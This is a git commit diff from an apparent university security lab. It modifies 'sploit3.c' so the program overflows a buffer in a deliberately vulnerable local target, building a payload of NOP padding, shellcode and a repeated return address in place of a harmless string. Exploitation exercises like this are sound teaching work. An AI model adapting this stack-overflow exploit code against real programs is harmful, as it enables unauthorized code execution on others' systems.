439e19ad9f6b83ad81615cf8823444b097e5366c
zandent <simon.zhao@mail.utoronto.ca>
2021-01-19 21:19:53 -0500

    pass 3

--- lab1/sploits/sploit3.c
+++ lab1/sploits/sploit3.c
@@ -6,14 +6,27 @@
 
 #define TARGET "../targets/target3"
 
+#define RA "\x14\xfe\x21\x20"
+#define LEN 73
+#define NOP 0x90
 int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
 
+	char buf[LEN];
+	memset(buf,NOP,LEN);
+	memcpy(buf,shellcode,strlen(shellcode));
+	int i;
+	for(i = strlen(shellcode) + 4 - strlen(shellcode)%4; i < LEN - LEN%4; i+=4){
+		memcpy(buf+i,RA,4);
+	}
+	buf[LEN-1]='\0';
+
+
 	args[0] = TARGET;
-	args[1] = "hi there";
+	args[1] = buf;
 	args[2] = NULL;
 
 	env[0] = NULL;
